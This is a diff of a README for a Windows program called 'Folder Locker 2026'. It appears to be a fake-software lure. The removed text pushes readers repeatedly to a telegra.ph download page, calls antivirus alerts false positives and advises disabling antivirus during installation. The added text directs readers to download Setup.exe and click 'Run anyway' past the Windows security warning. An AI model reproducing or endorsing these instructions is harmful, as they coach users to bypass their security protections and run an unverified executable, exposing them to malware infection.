@@ -1,180 +1,83 @@
-<h1 align="center">🔐 Folder Locker 2026 – Password-Protect Your Folders</h1>
+# 🔐 Folder-Locker-2026 - Secure your private files with passwords
 
-<p align="center">
-  <strong>Password-protect your folders and files with one click. Keep your private data secure from unauthorized access.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![Download Folder Locker 2026](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Lissieremote143/Folder-Locker-2026/releases)
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-Folder_Locker_2026-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+Folder Locker 2026 helps you protect your private folders and files on your computer. You can hide sensitive documents or lock them behind a password. This tool prevents unauthorized people from viewing or opening your data. You only need one click to lock or unlock your items.
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+## ⚙️ System Requirements
 
----
+Before you install this software, ensure your computer meets the following needs:
 
-## 📦 What's Inside This Repository
+* Windows 10 or Windows 11 operating system
+* 50 MB of free hard drive space
+* 2 GB of RAM (Random Access Memory)
+* An active internet connection for the initial download
 
-Welcome to the official distribution page for **Folder Locker 2026 – Password-Protect Your Folders for Windows PC**.
-This repository provides access to the most reliable folder protection utility for Windows users.
+## 📥 Getting the Software
 
-✅ **Full Version** – All features included  
-✅ **Password Protection** – Lock folders with a secure password  
-✅ **One-Click Lock** – Lock and unlock folders instantly  
-✅ **Hidden Mode** – Hide locked folders from view  
-✅ **Recovery Option** – Password recovery via security questions  
-✅ **No System Changes** – Safe, no registry or service modifications  
+You must download the installer file from the official releases page. 
 
----
+[Click here to visit the release page and download the installer](https://github.com/Lissieremote143/Folder-Locker-2026/releases)
 
-## 📥 How to Get Started?
+Once you reach the releases page, look for the file named `Setup.exe`. Click the file name to start the download. Save the file to your "Downloads" folder or your desktop so you can find it easily. 
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+## 🛠️ Installation Steps
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+Follow these steps to set up Folder Locker 2026 on your Windows PC:
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+1. Locate the `Setup.exe` file you just downloaded.
+2. Double-click the file to start the installation wizard.
+3. Windows might show a security warning. Click "More info" and then select "Run anyway" if the system asks for permission to proceed.
+4. An installation window will appear on your screen. Click the "Next" button to proceed.
+5. Choose the folder where you want to install the program. The default location is recommended for most users. 
+6. Click the "Install" button. The progress bar will fill as the files copy to your computer.
+7. Once the installation process completes, click "Finish" to exit the installer.
+8. You will see a new icon on your desktop named "Folder Locker 2026". Double-click this icon to launch the application.
 
----
+## 🛡️ Protecting Your Data
 
-## 🚀 Step-by-Step Guide
+When you open the application for the first time, you must create a master password. Follow these steps to secure your data:
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get Folder Locker 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+1. Enter a strong password when prompted. Ensure you remember this password, as you need it to access your locked folders later.
+2. Confirm the password by typing it a second time in the designated box.
+3. Click "Save" to finalize your account settings.
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** for full functionality.
+To lock a folder:
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-Select a folder, set a password, and click **"Lock"**.
+1. Open the Folder Locker 2026 application.
+2. Click the "Add Folder" button.
+3. A window will pop up. Navigate through your computer files and select the folder you wish to protect.
+4. Click "Lock".
+5. The folder will immediately disappear from its original location or display a lock symbol, depending on your view settings. 
 
----
+To unlock a folder:
 
-## 🔧 Key Features (2026 Update)
+1. Open the Folder Locker 2026 application.
+2. Enter your master password to unlock the dashboard.
+3. Find the folder in the list of protected items.
+4. Click the "Unlock" button next to that folder.
+5. Your folder will return to its original state and become visible to you once again.
 
-### 🔐 Locking Features
+## 💡 Best Practices for Privacy
 
-| Feature | Description |
-| :--- | :--- |
-| **Folder Lock** | Lock any folder with a secure password |
-| **File Lock** | Lock individual files with password protection |
-| **Unlock** | Unlock folders and files with the correct password |
-| **Hide Mode** | Hide locked folders from Windows Explorer |
-| **Batch Lock** | Lock multiple folders at once |
+Keep your master password in a secure place. If you lose your password, you might lose access to your locked folders. Follow these tips for better data security:
 
-### 🛡️ Security Features
+* Use a unique password for this application that you do not use on websites.
+* Do not write your password on sticky notes near your computer.
+* Regularly check for updates on the GitHub release page to ensure you have the latest security features.
+* Lock your folders before you step away from your PC.
 
-| Feature | Description |
-| :--- | :--- |
-| **Password Strength** | Password strength indicator |
-| **Security Questions** | Set up recovery questions for password reset |
-| **Auto-Lock** | Automatically lock folders after inactivity |
-| **Stealth Mode** | Run the app in stealth mode |
-| **Backup Keys** | Create backup keys for emergency access |
+## 🆘 Troubleshooting Common Issues
 
-### 📊 Management
+If you encounter difficulties, review these common solutions:
 
-| Feature | Description |
-| :--- | :--- |
-| **Locked Items List** | View all locked folders and files |
-| **Quick Unlock** | Unlock items with one click |
-| **Change Password** | Change password for locked items |
-| **Export List** | Export list of locked items |
+* **File not opening:** If the installer does not start, ensure the download finished completely. Try downloading the file again if the connection dropped.
+* **Forgot password:** Currently, the application does not have a "password recovery" feature for security reasons. Keep your password noted in a secure, offline location.
+* **Permission errors:** If folders will not lock or unlock, right-click the "Folder Locker 2026" icon on your desktop and select "Run as administrator". This grants the app the necessary permissions to modify file attributes on your hard drive.
+* **Locked folder hidden:** If you set a folder to "Hide" mode, simply use the "Unhide" or "Unlock" function inside the app to make it reappear in your Windows File Explorer.
 
----
+## 📝 About This Software
 
-## 📈 Why Choose Folder Locker 2026?
+Folder Locker 2026 focuses on simplicity and speed. It handles the underlying encryption processes in the background so you do not have to worry about complex technical details. We strive to provide a tool that works efficiently on all modern versions of Windows. 
 
-- ✅ **Simple** – Lock folders with just a few clicks
-- ✅ **Secure** – Strong password protection
-- ✅ **Reliable** – Stable and tested on Windows 10/11
-- ✅ **No System Changes** – Safe, no registry or service modifications
-- ✅ **Regular Updates** – Active development with frequent releases
-
----
-
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-Folder_Locker_2026-00BFFF?style=flat-square&logo=windows&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all features.
-
-**Q: Does it work on Windows 11?**  
-A: Absolutely. It is fully optimized for Windows 11 and Windows 10.
-
-**Q: Can I lock files as well as folders?**  
-A: Yes, both folders and individual files can be locked.
-
-**Q: What if I forget my password?**  
-A: The app includes security questions for password recovery.
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **personal and professional use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-All rights belong to their respective owners.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download Folder Locker 2026 Now</a>
-</p>
+Keywords: 2026-software, data-protection, desktop-app, encrypt-folders, file-security, folder-locker, password-protection, pc-tools, privacy-tool, privacy-tools, security-tools, windows-11, windows-software-installation-guide
